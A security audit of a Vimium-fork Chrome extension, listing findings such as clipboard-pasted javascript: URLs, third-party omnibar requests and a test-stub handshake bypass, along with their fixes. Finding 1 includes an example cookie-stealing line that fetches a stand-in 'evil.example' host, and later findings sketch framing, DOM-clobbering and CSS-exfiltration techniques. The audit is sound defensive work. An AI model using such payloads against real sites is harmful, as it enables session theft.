# Security audit: chrome-vim-shortcuts (fork of Vimium)

- **Repository:** github.com/RickardOtv/chrome-vim-shortcuts
- **Base commit:** `5aa29614bf1dce05e0d316f8c38722e17f9b38c3` (philc/vimium master, 2026-07-24). The fork was verified to be byte-identical to upstream at this commit.
- **Audit date:** 2026-11-10
- **Scope:** everything Chrome loads: `manifest.json`, `background_scripts/`, `content_scripts/`, `lib/`, `pages/`, `resources/`, `icons/`. Test files, build scripts and GitHub workflows are not loaded by the browser and were not reviewed.

## Verdict

**No malicious code was found.** There is no telemetry, no analytics, no remote code loading, no `eval`, and every script the extension runs is a file inside the package. Web pages cannot talk to the extension's background directly (no `externally_connectable`).

There are, however, real risks for a work setting: one way a website can get JavaScript run on another site, outbound network requests that carry what you type, a remote default new-tab page, and permissions much broader than the features you want. All of them are fixed by deleting or changing code in phase 3.

## Findings

| # | Severity | Finding | Action |
|---|---|---|---|
| 1 | Medium | Pasting a `javascript:` URL runs it on the current site | Fix |
| 2 | Medium | Omnibar sends what you type to third-party suggestion services | Delete |
| 3 | Medium | Default new tab is a remote web page (`vimium.github.io`) | Fix |
| 4 | Low | Settings are synced through your Google account | Fix |
| 5 | Low | Custom CSS is injected into every page; settings import accepts any file | Fix |
| 6 | Low | Local marks are stored in the website's own `localStorage` | Fix or delete |
| 7 | Low | Hint labels are built with `innerHTML` | Fix |
| 8 | Low | `data:` URLs can be opened in new tabs, bypassing a Chrome anti-phishing block | Fix |
| 9 | Low | Permissions much broader than needed | Trim |
| 10 | Info | No explicit Content Security Policy | Add |
| 11 | Info | Bug: "open in new window" always throws | Fix |

## Fix status (branch `trim`)

| # | Status | What changed |
|---|---|---|
| 1 | Fixed | `javascript:` execution removed. `TabOperations.toNavigableUrl` refuses `javascript:`, `data:` and `vbscript:` for every open-URL path (current tab, new tab, new window, incognito). |
| 2 | Fixed | Omnibar, completers, search engines and suggestion code deleted. Non-URL text becomes a plain search URL (`searchUrl` setting, Google by default). |
| 3 | Fixed | Vimium new-tab option removed; default is the browser's own new tab page. |
| 4 | Fixed | Settings read and written only in `chrome.storage.local`. Old sync migrations removed. |
| 5 | Partly fixed | Custom hint CSS and backup import kept (your choice). Import now drops any key that isn't a known setting. Only import your own backups. |
| 6 | Fixed | Local marks moved to `chrome.storage.local`; websites can no longer see them. |
| 7 | Fixed | Hint labels built with `textContent` spans. |
| 8 | Fixed | `data:` blocked (see 1) and removed from the "Chrome URL" prefix list. |
| 9 | Fixed | Permissions now `tabs, storage, sessions, scripting, webNavigation`. `bookmarks, history, notifications, favicon, search` removed. `_favicon/*` no longer web-accessible. |
| 10 | Fixed | CSP added for extension pages: `script-src 'self'`, `connect-src 'self'`, `object-src 'none'`. |
| 11 | Fixed | `openUrlInNewWindow` rewritten. Also fixed: global marks ignored the tab-load callback. |

Checked with a headless Chrome end-to-end test (30 checks, incl. no outbound requests from the extension). Upstream unit/DOM tests updated but not run (needs Deno).

### 1. Pasting a `javascript:` URL runs it on the current site (Medium)

- `content_scripts/mode_normal.js:201-205`: `p` reads the clipboard and sends it to `openUrlInCurrentTab`.
- `content_scripts/mode_visual.js:469-470`: `p` in visual mode does the same with the selected text.
- `background_scripts/tab_operations.js:15-64`: if the text starts with `javascript:`, it is injected as a `<script>` into the page's main world.

**Scenario:** any website can put text on your clipboard when you copy something from it. If that text is `javascript:fetch('https://evil.example/?'+document.cookie)` and you later press `p` on your work intranet tab, the script runs as that intranet site. Chrome's own address bar strips `javascript:` from pasted text for exactly this reason; Vimium bypasses that protection.

The existing guard (line 24-32) only blocks requests from subframes, not this case.

**Fix:** remove `javascript:` execution from `openUrlInCurrentTab` entirely (this also removes bookmarklet support from the omnibar, which goes in finding 2 anyway).

### 2. Omnibar sends what you type to third parties (Medium)

- `background_scripts/completion/search_wrapper.js:56-74`: the only outbound network call in the extension.
- `background_scripts/completion/search_engines.js`: Google, YouTube, Wikipedia, Bing, Amazon, DuckDuckGo, Merriam-Webster, Brave, Qwant, Kagi.
- `lib/settings.js:58-74`: a Wikipedia keyword (`w`) is configured by default, so typing `w something` in the omnibar sends "something" to en.wikipedia.org as you type.

It only fires for custom search-engine keywords, after 4+ characters, but it is still typed text leaving the machine.

**Fix:** delete the omnibar and completion code (phase 3).

### 3. Default new tab is a remote page (Medium)

- `lib/settings.js:8` and `:75`: `newTabDestination` defaults to `https://vimium.github.io/new-tab/`.
- `content_scripts/vimium_frontend.js:257-266`: Vimium opens the omnibar automatically when it sees that page.

Every `t` loads a page hosted on GitHub Pages and controlled by whoever controls that GitHub organisation. The page cannot use extension APIs, but it is an unnecessary third-party request with your IP address and timing.

**Fix:** default to the browser's own new tab page and remove the Vimium new-tab option.

### 4. Settings sync through your Google account (Low)

- `lib/settings.js:125, 249-250`: settings live in `chrome.storage.sync`.

Synced data includes key mappings, search engines, exclusion rules (a list of sites you've disabled it on) and custom CSS. No browsing history is synced. Anyone who gets into your Google account, or a work profile with sync, could change your settings (see finding 5).

**Fix:** switch to `chrome.storage.local`.

### 5. Custom CSS on every page; unchecked settings import (Low)

- `background_scripts/main.js:492-504`, `:891-895`: the `userDefinedLinkHintCss` setting is injected into every page and frame.
- `pages/options.js:334-361`: "Restore backup" accepts any JSON file and writes it straight into settings.

CSS can leak page content (for example attribute selectors that load a remote image per character typed into a password field). This only matters if someone else's CSS gets into your settings: an untrusted backup file, or a compromised sync account.

**Fix:** keep custom CSS but only import your own backups; or remove the custom-CSS setting and the import feature. Finding 4's fix closes the sync route.

### 6. Local marks stored in the site's `localStorage` (Low)

- `content_scripts/marks.js:80` and nearby: `m` + lowercase letter writes `vimiumMark|<url>|<letter>` into the page's own `localStorage`.

The website can read these keys, which tells it you use this extension (fingerprinting). Contents are only scroll positions.

**Fix:** move to `chrome.storage.local`, or delete marks if you don't use them.

### 7. Hint labels built with `innerHTML` (Low)

- `content_scripts/link_hints.js:876, 960, 1115-1121`.

The caption can contain page text (input values, image alt text). Each character is wrapped in its own `<span>`, which happens to make tag injection impossible, so this is not exploitable today. It is fragile, though: a small refactor could make it injectable.

**Fix:** build the spans with `createElement` and `textContent`.

### 8. `data:` URLs bypass Chrome's top-level block (Low)

- `lib/url_utils.js:107`: `data:` is passed through as-is.
- `background_scripts/tab_operations.js`, `lib/dom_utils.js:386-418`: link hints opened in a new tab, and `P`, open the URL through `chrome.tabs.create`.

Chrome blocks web pages from navigating a tab to `data:` URLs because they are used for phishing. A link opened through the extension skips that block.

**Fix:** refuse `data:` (and `javascript:`) in `openUrlInNewTab`, `openUrlInNewWindow` and `openUrlInIncognito`.

### 9. Broad permissions (Low)

`manifest.json` requests `tabs`, `bookmarks`, `history`, `storage`, `sessions`, `notifications`, `scripting`, `favicon`, `webNavigation`, `search`, plus `<all_urls>`. The history completer loads up to 20,000 history entries into memory (`completers.js:825-829`). None of this is sent anywhere, but any future bug inherits that access.

**Fix:** after phase 3, expected to keep `tabs`, `sessions` (for `X`), `storage`, `scripting`, `webNavigation`, and `<all_urls>`; drop `bookmarks`, `history`, `search`, `favicon`, `notifications`.

### 10. No explicit Content Security Policy (Info)

The MV3 default already blocks inline and remote scripts on extension pages. An explicit policy makes the "no network" rule enforced by Chrome, not just by convention:

```json
"content_security_policy": {
  "extension_pages": "script-src 'self'; object-src 'none'; connect-src 'self'; style-src 'self' 'unsafe-inline'"
}
```

### 11. Bug: open in new window (Info)

`background_scripts/tab_operations.js:135` refers to `tabConfig`, which doesn't exist in that function, so `openUrlInNewWindow` always throws. Not a security issue.

## Verified safe

- **Network:** three `fetch` calls in the whole extension. `background_scripts/main.js:97` and `lib/url_utils.js:29` read the extension's own bundled files; the third is finding 2.
- **No dynamic code:** no `eval`, `new Function`, string `setTimeout`, `importScripts`, WebSocket or beacon.
- **All scripts local:** every `<script>` in `pages/*.html` points to a file in the package; no inline event handlers.
- **Messaging:** web pages cannot message the background (no `externally_connectable`). Content scripts run in Chrome's isolated world, so page JavaScript cannot read their data.
- **UI iframes** (omnibar, HUD, help): use a private `MessageChannel` set up with a random per-session secret and an exact target origin (`ui_component.js:80-88`, `ui_component_messenger.js:8-22`). A page that embeds these iframes itself cannot talk to them.
- **Synthetic events ignored:** key and click handlers run only for events the browser marks as trusted (`lib/utils.js:3-13`), so a page cannot fake keypresses to trigger commands.
- **Clipboard:** read only when you press `p`/`P`; written only for yank commands.
- **Omnibar rendering:** page titles and URLs are escaped before being inserted (`completers.js:98, 126, 130`) and only appear in text positions.
- **Data at rest:** find history is in `chrome.storage.session` (cleared on browser restart); global marks in `chrome.storage.local`.
- **External links** in help/options pages (GitHub, Chrome Web Store) open only when clicked.
- `resources/tlds.txt`: plain list of 1,591 top-level domains, including internationalised ones.

## Coverage

Being explicit about how each file was reviewed:

**Read in full, line by line:** `manifest.json`; `background_scripts/` main.js, tab_operations.js, bg_utils.js, exclusions.js, marks.js, tab_recency.js, reload.js, user_search_engines.js, commands.js, completion/completers.js, completion/search_wrapper.js, completion/search_engines.js; `lib/` utils.js, settings.js, url_utils.js; `content_scripts/` ui_component.js, hud.js, vomnibar.js, vimium_frontend.js; `pages/` ui_component_messenger.js, hud_page.js, vomnibar_page.js, command_listing.js, help_dialog_page.js, options.js, action.js, exclusion_rules_editor.js, doc_search_completion.js, all_content_scripts.js.

**Security-relevant sections read, rest pattern-scanned:** content_scripts/link_hints.js (activation, labels, link text), mode_normal.js (URL and clipboard commands), mode_visual.js (yank/open), marks.js; lib/dom_utils.js (click simulation, CSS injection), lib/find_mode_history.js.

**Pattern-scanned only** (about 4,000 lines of UI logic: scrolling, key parsing, visual selection, find mode): ranking.js, all_commands.js, scroller.js, mode.js, mode_insert.js, mode_key_handler.js, mode_find.js, keyboard_utils.js, handler_stack.js, rect.js, types.js, chrome_api_stubs.js, and all HTML/CSS. The scan covered every pattern that can reach the network, run code, write HTML, touch storage or the clipboard, call a Chrome API, or send a message; none of these files had a hit beyond those listed above.

**Remaining step:** after phase 3 deletes the omnibar, bookmarks, history and other unused features, read every remaining file line by line. That second pass covers less code and is the one that matters, since it is exactly what will run.

## Second pass (after trim and phase 4)

- **Date:** 2026-11-10. **Commit:** `1c110ad0`.
- **Method:** four independent reviewers each read about a quarter of the shipped code. Together they covered every remaining file in `manifest.json`, `background_scripts/`, `content_scripts/`, `lib/` and `pages/` (about 12,800 lines), line by line. Each finding was traced through the code. The two Medium findings were re-checked by hand. None were tested in a browser yet.
- **Verdict:** still no malicious code, telemetry or remote code. No High findings. The two Medium findings share one cause: test-only code ships in the extension, and a website can switch it on.

| # | Severity | Finding | Fix |
|---|---|---|---|
| 12 | Medium | `pages/hud_page.js` imports `lib/chrome_api_stubs.js`. Any site can frame `hud_page.html?dom_tests=true`, which replaces `chrome` with stubs. The secret becomes `undefined`, so posting `undefined` passes the handshake (`ui_component_messenger.js:13`). The site then drives the HUD, including its clipboard read and write handlers. | Remove the stub import from shipped pages. Require the secret to be a non-empty string. |
| 13 | Medium | Content scripts read page-clobberable globals (`vimiumDomTestsAreRunning`, `isVimiumHelpDialog`, `isVimiumHelpDialogPage`). With test mode on, `ui_component.js:87` posts the secret and port with target origin `*`. The shadow root is open, so the page can re-point the iframe and catch both. Needs a browser check that DOM clobbering reaches the isolated world. | Delete the test-flag branches. Always use the exact extension origin. |
| 14 | Low | URL handling is a blocklist. Clipboard (`p`/`P`), visual-mode selection and incognito link hints can open `chrome://`, `file://`, other extensions' pages, `pages/reload.html` (reloads this extension) and external app protocols. Web pages can't do this themselves. `createTab` in a window or incognito skips the check entirely (`main.js:239-247`). The final search URL (`searchUrl` setting) is never re-checked. | Allowlist `http(s)`, `about:blank`/new tab, and `view-source:` + `http(s)`. Check the final URL. Apply the check to every open path. |
| 15 | Low | Settings import checks keys but not types or values. A bad file breaks the options page and popup, or kills the extension on every page through `exclusionRules`. It can also set `searchUrl` to a `data:` URL or add exfiltrating CSS. | Validate types and allowed values. Preview custom CSS before applying it. |
| 16 | Low | The UI shadow root is open, and its iframe `load` listener accepts fake events. A page can hide or re-point the HUD and help iframes, read the custom CSS, or permanently break find, yank and paste on that site. | Closed shadow root. Trusted, once-only load listener. |
| 17 | Low | Web-accessible resources (`command_listing.html`, `tlds.txt`, fixed URLs) let any site detect this fork, which fingerprints you across sites. Framing the help page also allows clickjacking. | Remove unneeded entries. Use `use_dynamic_url`. |
| 18 | Low | "Yank link text" copies `textContent`, which includes hidden text and newlines (pastejacking into a terminal). | Use `innerText` and collapse whitespace. |
| 19 | Low | Find queries are shared across all sites through global history. Pressing `n` on another site reuses the last query, and the match is visible to that page through the DOM selection. | Keep history per origin. Don't auto-adopt another site's query. |
| 20 | Low (compromised renderer) | The background trusts message contents: `runBackgroundCommand` runs any command with any options, the frame relays forward any message type, and filter-mode hints send input values to every frame. Content scripts can write `storage.local` settings, so custom CSS can reach every site. | Look up commands from the real key mappings. Allowlist relayed messages. Keep input values out of link text. Restrict storage access where possible. |
| 21 | Info | Local and global marks store full URLs, including query-string tokens. | Drop the query string, or hash it. |
| 22 | Info | Non-URL text pasted with `p`/`P` is sent to Google. This is the only network egress, and it needs a key press. A password left on the clipboard would leak on an accidental `p`. | Optional: ask first, or only open real URLs. |
| 23 | Info | Dead or buggy code: `simulateClickDefaultAction`, `escapeHtml`, `selectSpecificTab` and `reload.html`/`reload.js` are unused. Bugs: replay check (`link_hints.js:268`), `passNextKeyKeys` listens to the wrong storage area, `pathName` typo, `toggleMuteTab` never unmutes, duplicate settings listeners, global-marks crashes, Google host regex matches `google.attacker.com`. | Delete the dead code. Fix the bugs. |

Full reviewer reports, with file and line references and the "verified safe" lists: `audit/second-pass-{bg,hints,modes,pages}.md`. ### Fix status, second pass

| # | Status | What changed |
|---|---|---|
| 12 | Fixed | `chrome_api_stubs.js` never installs inside the real extension (`chrome.runtime.id` present). The secret check requires a non-empty string. Confirmed exploitable in a browser before the fix (the framed HUD answered); now it doesn't. |
| 13 | Fixed | Test and help-page flags only count when exactly `true`, which a page can't fake with an element. Confirmed in a browser that `<div id=vimiumDomTestsAreRunning>` switched on test mode before the fix. Side effect: link hints inside the help dialog now work as upstream intended (the old code read a misspelled flag). |
| 14 | Fixed | New `UrlUtils.isSafeToOpen` allowlist (http, https, new tab, `about:blank`, view-source of http(s)), checked on the final URL, including search URLs. `createTab` in a window or incognito now uses the same check. Dead `simulateClickDefaultAction` deleted. In the browser test, Chrome also refused these opens before the fix, so the new code is a second layer here. |
| 15 | Fixed | `Settings.validSettings` checks every value's type, plus allowed values for `newTabDestination`, `searchUrl`, `newTabCustomUrl`, `exclusionRules` and `scrollStepSize`. It runs on save, import and load. Import shows changed key mappings and custom CSS and asks before applying. |
| 16 | Fixed | Shadow roots closed. The iframe `load` handler only acts on the first trusted event. Fixed the dead "load once" guard. |
| 17 | Partly fixed | `command_listing.html` and `tlds.txt` removed from web-accessible resources. `use_dynamic_url` was tried, but it breaks HUD clipboard access (Chrome permissions policy), so the HUD and help pages still have fixed URLs and a site can still detect the extension. |
| 18 | Fixed | "Yank link text" copies visible text (`innerText`) on one line. |

The headless Chrome end-to-end test now has 37 checks, including attack attempts for #12–#14, #16 and #17. #19–#23 are still open.
